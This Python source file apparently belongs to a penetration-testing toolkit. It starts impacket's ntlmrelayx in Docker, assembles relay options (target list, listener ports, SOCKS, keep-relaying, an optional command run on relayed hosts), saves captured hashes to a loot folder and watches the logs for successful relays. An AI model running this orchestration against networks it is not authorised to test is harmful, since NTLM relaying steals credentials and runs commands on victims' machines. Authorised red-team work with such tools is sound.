"""Controller for impacket ntlmrelayx Docker container."""
from __future__ import annotations

import shutil
import threading
import time
from pathlib import Path
from typing import Dict, Optional

from docker.models.containers import Container

from btc_module_relay_nxc_impckt_rspndr.config import AppConfig
from btc_module_relay_nxc_impckt_rspndr.logger import get_logger, jsonl_event
from btc_module_relay_nxc_impckt_rspndr.session import SessionRegistry
from btc_module_relay_nxc_impckt_rspndr.utils.docker_helpers import (
    ensure_image,
    get_client,
    run_detached,
    stop_container,
)

logger = get_logger()

CONTAINER_NAME = "btc-relay-ntlmrelayx"


class NtlmrelayxController:
    """Manages the lifecycle and log tailing of the ntlmrelayx container."""

    def __init__(self, cfg: AppConfig, registry: SessionRegistry) -> None:
        self.cfg = cfg
        self.ntlm_cfg = cfg.ntlmrelayx
        self.registry = registry
        self.client = get_client()
        self._container: Optional[Container] = None
        self._stop_event = threading.Event()
        self._log_thread: Optional[threading.Thread] = None

    def start(self) -> None:
        if not self.ntlm_cfg.enabled:
            logger.info("ntlmrelayx is disabled in config")
            return

        ensure_image(self.client, self.cfg.docker.impacket_image)
        stop_container(self.client, CONTAINER_NAME)

        volumes = self._build_volumes()
        self._prepare_targets_file()
        cmd = self._build_command()

        self._container = run_detached(
            self.client,
            image=self.cfg.docker.impacket_image,
            command=cmd,
            name=CONTAINER_NAME,
            network_mode=self.cfg.docker.network_mode,
            volumes=volumes,
        )
        logger.info(f"ntlmrelayx started: {self._container.short_id}")

        # Start log tailing in background thread
        self._stop_event.clear()
        self._log_thread = threading.Thread(target=self._tail_logs, daemon=True)
        self._log_thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._log_thread:
            self._log_thread.join(timeout=5)
        stop_container(self.client, CONTAINER_NAME)
        self._container = None
        logger.info("ntlmrelayx stopped")

    def is_running(self) -> bool:
        if not self._container:
            return False
        try:
            self._container.reload()
            return self._container.status == "running"
        except Exception:
            return False

    def _build_volumes(self) -> Dict[str, Dict[str, str]]:
        loot = Path(self.cfg.docker.loot_dir)
        logs = Path(self.cfg.docker.logs_dir)
        loot.mkdir(parents=True, exist_ok=True)
        logs.mkdir(parents=True, exist_ok=True)
        return {
            str(loot.resolve()): {"bind": "/loot", "mode": "rw"},
            str(logs.resolve()): {"bind": "/logs", "mode": "rw"},
        }

    def _prepare_targets_file(self) -> None:
        """Copy user targets file into the shared logs volume so ntlmrelayx can read it."""
        src = Path(self.ntlm_cfg.targets_file)
        if src.exists():
            dst = Path(self.cfg.docker.logs_dir) / "targets.txt"
            shutil.copy(str(src), str(dst))
            logger.info(f"Copied targets file to {dst}")

    def _build_command(self) -> list[str]:
        """Build shell command for ntlmrelayx (runs via /bin/sh -c).

        ntlmrelayx.py reads stdin to stay alive (sys.stdin.read()).
        We pipe tail -f /dev/null into it so stdin never closes,
        keeping the process alive while the container runs.
        Log output is redirected to /logs/ntlmrelayx.log.
        """
        parts = ["ntlmrelayx.py"]
        cfg = self.ntlm_cfg

        if cfg.targets_file:
            parts += ["-tf", "/logs/targets.txt"]
        if cfg.interface_ip:
            parts += ["-ip", cfg.interface_ip]
        # Server ports
        parts += ["--smb-port", str(cfg.smb_port)]
        parts += ["--http-port", str(cfg.http_port)]
        parts += ["--wcf-port", str(cfg.wcf_port)]
        parts += ["--raw-port", str(cfg.raw_port)]
        parts += ["--rpc-port", str(cfg.rpc_port)]
        # Server toggles
        if cfg.no_smb_server:
            parts.append("--no-smb-server")
        if cfg.no_http_server:
            parts.append("--no-http-server")
        if cfg.no_wcf_server:
            parts.append("--no-wcf-server")
        if cfg.no_raw_server:
            parts.append("--no-raw-server")
        if cfg.no_rpc_server:
            parts.append("--no-rpc-server")
        if cfg.no_winrm_server:
            parts.append("--no-winrm-server")
        if cfg.smb2support:
            parts.append("-smb2support")
        if cfg.socks:
            parts.append("-socks")
            parts += ["-socks-port", str(cfg.socks_port)]
        if cfg.keep_relaying:
            parts.append("--keep-relaying")
        if cfg.command:
            parts += ["-c", f"'{cfg.command}'"]
        # Loot output files
        parts += ["-of", "/loot/hashes", "-l", "/loot"]
        relay_cmd = " ".join(parts)
        # Pipe tail into ntlmrelayx to keep stdin open; redirect stdout to log
        shell_cmd = f"tail -f /dev/null | {relay_cmd} > /logs/ntlmrelayx.log 2>&1"
        return [shell_cmd]

    def _tail_logs(self) -> None:
        """Tail the mounted log file from host side."""
        log_path = Path(self.cfg.docker.logs_dir) / "ntlmrelayx.log"
        for _ in range(30):
            if self._stop_event.is_set():
                return
            if log_path.exists():
                break
            time.sleep(0.5)

        if not log_path.exists():
            logger.warning("ntlmrelayx.log never appeared")
            return

        with log_path.open("r", encoding="utf-8", errors="replace") as fh:
            while not self._stop_event.is_set():
                line = fh.readline()
                if not line:
                    time.sleep(0.5)
                    continue
                line = line.rstrip("\n")
                self._parse_line(line)

    def _parse_line(self, line: str) -> None:
        """Stub: parse ntlmrelayx output for relay successes."""
        if "authenticated" in line.lower() or "relay" in line.lower():
            logger.info(f"[ntlmrelayx] {line}")
            jsonl_event("ntlmrelayx_log", line=line)
        else:
            logger.debug(f"[ntlmrelayx] {line}")
